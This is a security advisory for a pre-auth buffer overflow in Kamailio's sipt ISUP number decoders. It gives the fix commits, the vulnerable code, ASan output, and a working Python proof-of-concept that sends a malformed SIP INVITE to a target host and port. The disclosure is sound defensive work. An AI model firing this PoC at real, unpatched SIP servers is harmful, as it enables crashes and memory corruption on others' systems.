# sipt: Pre-auth global buffer overflow in ISUP BCD number decoders

**Module**: sipt
**Severity**: Critical (pre-auth, attacker-controlled write, 480 bytes past buffer)
**Tested against**: kamailio commit `7c2d6bffa348` (2026-04-21)
**Fixed in**: [`3667bebf8d`](https://github.com/kamailio/kamailio/commit/3667bebf8d0bea07ed16218fd921d07db87aeb21) ("sipt: Add robust length validations in ISUP message parser")
**Committed**: 2026-09-08 13:52:47 +02:00
**Stable backports**: Kamailio 6.1 [`e668dca95a`](https://github.com/kamailio/kamailio/commit/e668dca95ab596e3863066354cece893408386d8) and Kamailio 6.0 [`7a7b742ea6`](https://github.com/kamailio/kamailio/commit/7a7b742ea6c7cbc7abb6aa4e7a0169dac754bdde), both committed 2026-09-08

---

## Fix

The fix defines the decoder output size as `MAX_SB_BUF_LEN` (26 bytes) and applies three layers of validation to all six affected number decoders. It rejects declared ISUP parameter lengths that are non-positive or extend beyond the received packet, stops decoding before the next two output digits would exceed the destination buffer, and checks every source offset before reading packet data. It also guarantees that the decoded number is NUL-terminated within the 26-byte buffer.

The commit previously cited here, [`ed1790d404`](https://github.com/kamailio/kamailio/commit/ed1790d404598f71417934465942fd3eb1b0dcd2), changed SIPT number *encoding* and did not modify these vulnerable decoder loops. The overflow described in this report remained present until `3667bebf8d`.

Six BCD number decoding functions in `ss7_parser.c` write decoded telephone number digits into a shared 26-byte static buffer without validating the attacker-supplied length byte. A single SIP INVITE with a malformed ISUP body achieves a 480-byte global buffer overflow, corrupting adjacent static variables in the sipt module's BSS segment.

The overflow is pre-authentication — no SIP registration or credentials are required. The only prerequisite is that the `sipt` module is loaded and the routing script accesses any `$sipt(...)` pseudo-variable (the standard configuration documented in the module's own README).

## Vulnerable code

Six functions share the same unbounded decoding pattern. Here is `isup_get_calling_party()` from `src/modules/sipt/ss7_parser.c`:

```c
// ss7_parser.c — isup_get_calling_party(), line 269
int isup_get_calling_party(unsigned char *buf, unsigned int len, ...)
{
    static char sb_buf[26];   // also sb_s_buf[26] in sipt.c:319 and :598
    int sb_i = 0, sb_j = 0;
    int sbparamlen;

    sbparamlen = (buf[offset + 1] & 0xFF) - 2;  // attacker controls this: 0xFF → 253

    while((sbparamlen > 0) && (buf[offset] != 0)) {
        sb_buf[sb_i] = "0123456789ABCDEF"[(buf[offset + 4 + sb_j] & 0x0F)];
        sb_buf[sb_i + 1] = "0123456789ABCDEF"[(buf[offset + 4 + sb_j] >> 4 & 0x0F)];
        sb_i = sb_i + 2;    // NO BOUNDS CHECK — writes up to 506 bytes
        sbparamlen--;
        sb_j++;
    }
}
```

The parameter length byte is read directly from the ISUP body at `buf[offset + 1]`. Setting it to `0xFF` yields `sbparamlen = 253`, which produces 506 bytes of output (2 ASCII hex digits per iteration) into the 26-byte `sb_buf`. The overflow corrupts 480 bytes of adjacent global data.

All six affected functions use identical logic:
- `isup_get_calling_party()` — line 269
- `isup_get_called_party()` — line 334
- `isup_get_redirection_number()` — line 423
- `isup_get_redirecting_number()` — line 477
- `isup_get_original_called_number()` — line 515
- `isup_get_generic_number()` — line 553

## Call chain

```
udp_rcv_loop()
  → receive_msg()
    → run_top_route()
      → do_action()                        [routing script: xlog("$sipt(...)")]
        → pv_get_spec_value()
          → sipt_get_pv()
            → sipt_get_calling_party()
              → isup_get_calling_party()   ← OVERFLOW HERE
```

## PoC

```python
#!/usr/bin/env python3
"""
Kamailio SIPT module — BCD number decoding global buffer overflow.

Sends a SIP INVITE with an ISUP IAM body containing called_party_number
length byte = 0xFF. When the routing script reads $sipt(called_party_number),
isup_get_called_party() decodes 253 BCD byte-pairs (506 bytes) into a
26-byte static buffer sb_s_buf, overflowing by 480 bytes.

Same bug in isup_get_calling_party, isup_get_redirection_number,
isup_get_redirecting_number, isup_get_original_called_number,
isup_get_generic_number — all use the same unbounded loop pattern.

Requires: sipt.so loaded, script accesses $sipt(called_party_number) or similar PV
Tested: kamailio commit 7c2d6bffa348, ASAN build, aarch64
"""
import socket
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 5060

def build_iam_overflow():
    body = bytearray()
    body.append(0x01)        # IAM message type
    body.append(0x00)        # Nature of connection
    body.extend([0x60, 0x01])  # Forward call indicators
    body.append(0x0a)        # Calling party's category
    body.append(0x03)        # Transmission medium requirement
    body.append(0x02)        # Pointer to called party number
    body.append(0x00)        # Pointer to optional part (none)
    # Called party number: length = 0xFF → sbparamlen = 253
    body.append(0xFF)        # Length byte (triggers 253 loop iterations)
    body.append(0x83)        # Odd, NAI=3
    body.append(0x10)        # Numbering plan
    # 253 bytes of BCD digit data
    for i in range(253):
        body.append(0x12)    # BCD: "21" repeated
    return bytes(body)

def build_invite(body, cid):
    return (
        f"INVITE sip:test@localhost SIP/2.0\r\n"
        f"Via: SIP/2.0/UDP {TARGET}:9999;branch=z9hG4bK-{cid}\r\n"
        f"From: <sip:poc@{TARGET}>;tag={cid}\r\n"
        f"To: <sip:test@localhost>\r\n"
        f"Call-ID: {cid}@localhost\r\n"
        f"CSeq: 1 INVITE\r\n"
        f"Max-Forwards: 70\r\n"
        f"Contact: <sip:poc@{TARGET}:9999>\r\n"
        f"Content-Type: application/isup\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"\r\n"
    ).encode() + body

def send(data):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(3)
    s.sendto(data, (TARGET, PORT))
    try:
        return s.recv(4096)
    except socket.timeout:
        return None

body = build_iam_overflow()
msg = build_invite(body, "sipt-global-of")

print(f"[*] ISUP body: {len(body)} bytes, called party length=0xFF")
print(f"[*] Will write 506 bytes into 26-byte global buffer (480-byte overflow)")
print(f"[*] Sending to {TARGET}:{PORT}")

r = send(msg)
print(f"[*] Response: {'GOT REPLY' if r else 'NO REPLY — check ASAN log'}")
```

## ASan output

```
=================================================================
==7==ERROR: AddressSanitizer: global-buffer-overflow on address 0xfffff7163d1a at pc 0xfffff7143438 bp 0xffffffff64c0 sp 0xffffffff64b8
WRITE of size 1 at 0xfffff7163d1a thread T0
    #0 0xfffff7143434 in isup_get_calling_party /usr/src/kamailio/build/src/modules/sipt/ss7_parser.c:282:17
    #1 0xfffff713a2d4 in sipt_get_calling_party /usr/src/kamailio/build/src/modules/sipt/sipt.c:328:2
    #2 0xfffff7137cd4 in sipt_get_pv /usr/src/kamailio/build/src/modules/sipt/sipt.c:748:13
    #3 0xaaaaab2b6470 in pv_get_spec_value /usr/src/kamailio/build/src/core/pvapi.c:1357:8
    #4 0xaaaaab2bb034 in pv_printf_mode /usr/src/kamailio/build/src/core/pvapi.c:1422:8
    #5 0xaaaaab2bd580 in pv_printf /usr/src/kamailio/build/src/core/pvapi.c:1464:9
    #6 0xfffff73272fc in xl_print_log /usr/src/kamailio/build/src/modules/xlog/xl_lib.c:39:9
    #7 0xfffff73312dc in xlog_helper /usr/src/kamailio/build/src/modules/xlog/xlog.c:254:5
    #8 0xfffff733410c in xlog_2_helper /usr/src/kamailio/build/src/modules/xlog/xlog.c:333:9
    #9 0xfffff732dd44 in xlog_2 /usr/src/kamailio/build/src/modules/xlog/xlog.c:341:9
    #10 0xaaaaaadc93c4 in do_action /usr/src/kamailio/build/src/core/action.c:1133:4
    #11 0xaaaaaaded844 in run_actions /usr/src/kamailio/build/src/core/action.c:1620:9
    #12 0xaaaaaadccfa4 in do_action /usr/src/kamailio/build/src/core/action.c
    #13 0xaaaaaaded844 in run_actions /usr/src/kamailio/build/src/core/action.c:1620:9
    #14 0xaaaaaadf0390 in run_top_route /usr/src/kamailio/build/src/core/action.c:1703:8
    #15 0xaaaaab2f1c7c in receive_msg /usr/src/kamailio/build/src/core/receive.c:535:8
    #16 0xaaaaab5e11b0 in udp_rcv_loop /usr/src/kamailio/build/src/core/udp_server.c:1420:4
    #17 0xaaaaaada4b28 in main_loop /usr/src/kamailio/build/src/main.c
    #18 0xaaaaaadbee58 in main /usr/src/kamailio/build/src/main.c:3439:8
    #19 0xfffff7d17740  (/lib/aarch64-linux-gnu/libc.so.6+0x27740) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #20 0xfffff7d17814 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x27814) (BuildId: 3ff3f95a1642952473d0d5739aaf308b0e24f694)
    #21 0xaaaaaacdf56c in _start (/usr/local/sbin/kamailio+0x23f56c) (BuildId: 3b3141f943dac6d00cd56f3642337d296592ee6f)

0xfffff7163d1a is located 38 bytes to the left of global variable 'sb_s_buf' defined in '/usr/src/kamailio/src/modules/sipt/sipt.c:598:14' (0xfffff7163d40) of size 26
0xfffff7163d1a is located 0 bytes to the right of global variable 'sb_s_buf' defined in '/usr/src/kamailio/src/modules/sipt/sipt.c:319:14' (0xfffff7163d00) of size 26
SUMMARY: AddressSanitizer: global-buffer-overflow /usr/src/kamailio/build/src/modules/sipt/ss7_parser.c:282:17 in isup_get_calling_party
Shadow bytes around the buggy address:
  0x200ffee2c750: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x200ffee2c760: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x200ffee2c770: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x200ffee2c780: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
  0x200ffee2c790: f9 f9 f9 f9 00 00 00 00 00 00 00 f9 f9 f9 f9 f9
=>0x200ffee2c7a0: 00 00 00[02]f9 f9 f9 f9 00 00 00 02 f9 f9 f9 f9
  0x200ffee2c7b0: 00 00 00 02 f9 f9 f9 f9 00 00 00 02 f9 f9 f9 f9
  0x200ffee2c7c0: 00 00 00 02 f9 f9 f9 f9 00 00 00 02 f9 f9 f9 f9
  0x200ffee2c7d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ffee2c7e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x200ffee2c7f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==7==ABORTING
```

## Build & reproduce

```bash
# Clone vulnerable commit
git clone --branch master https://github.com/kamailio/kamailio.git
cd kamailio && git checkout 7c2d6bffa348

# ASAN build
mkdir build && cd build
CC=clang cmake .. \
    -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer -O1 -g" \
    -DCMAKE_EXE_LINKER_FLAGS="-fsanitize=address" \
    -DCMAKE_SHARED_LINKER_FLAGS="-fsanitize=address"
make -j$(nproc) && make install

# Routing script must access $sipt pseudo-variable, e.g.:
#   if(has_body("application/isup")) { xlog("L_INFO", "$sipt(calling_party_number)\n"); }

# Run
ASAN_OPTIONS="detect_leaks=0:halt_on_error=0:log_path=/tmp/asan" \
    kamailio -DD -E -f kamailio.cfg

# Fire PoC
python3 poc.py 127.0.0.1 5060

# Check
cat /tmp/asan.*
```
